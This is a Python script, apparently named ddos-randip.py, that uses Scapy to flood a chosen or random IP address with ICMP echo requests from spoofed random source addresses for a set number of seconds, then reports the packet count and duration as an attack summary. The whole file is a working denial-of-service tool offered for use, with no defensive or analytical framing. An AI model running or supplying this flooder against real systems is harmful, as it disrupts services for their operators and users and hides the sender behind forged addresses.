import time
from argparse import ArgumentParser
from scapy.all import *

def print_summary(num, duration):
    output = '\n'
    output += '\n==============================\n'
    output += 'Summary of the attack\n'
    output += '\n'
    output += f'Total packets:  {num}\n'
    output += f'Total duration: {duration}\n'
    output += '==============================\n'
    print(output)

def send_packet(dstIP='', rand=False, inter=0.01):
    ip = IP()
    ip.src = RandIP()
    if rand:
        ip.dst = RandIP()
    else:
        ip.dst = dstIP

    icmp = ICMP()
    icmp.type = 8
    icmp.code = 0
    
    print(f'src: {ip.src}, dst: {ip.dst}')
    send(ip/icmp, inter=inter)


def ddos_attack():
    usage = 'Usage: sudo python3 ddos-randip.py [--random] [--dest <ip>] [--time <duration of ddos attack>] [--help]'
    argparser = ArgumentParser(usage=usage)
    argparser.add_argument('-r', '--random', action='store_true', help='use random IP for destination')
    argparser.add_argument('-d', '--dest', type=str, dest='dstIP' , help='use specific IP for destination')
    argparser.add_argument('-t', '--time', type=int, dest='time',required=True, help='specify duration of ddos attack in seconds')
    args = argparser.parse_args()

    t_end = time.time() + args.time
    count = 0
    
    if args.random:
        while time.time() < t_end:
            send_packet(rand=True)
            count += 1
        return count
    else:
        if args.dstIP:
            while time.time() < t_end:
                send_packet(dstIP=args.dstIP, inter=0.01)
                count += 1
            return count
        else:
            print("Please specify destination IP address or set --random option")
            exit(1)


if __name__ == '__main__':
    duration = 0
    t_start = time.time()

    try:
        num = ddos_attack()
        t_end = time.time()
        duration = t_end - t_start
        print_summary(num, duration)
    except PermissionError:
        print('Permission Error....')
        print('This program requires administrative permission')
        print('Usage: sudo python3 ddos-randip.py [--random] [--dest <ip>] [--time <duration of ddos attack>] [--help]')
        exit(1)
    except KeyboardInterrupt:
        print('\nTerminating the program.....')
        print('Exited successfully')
        exit(0)
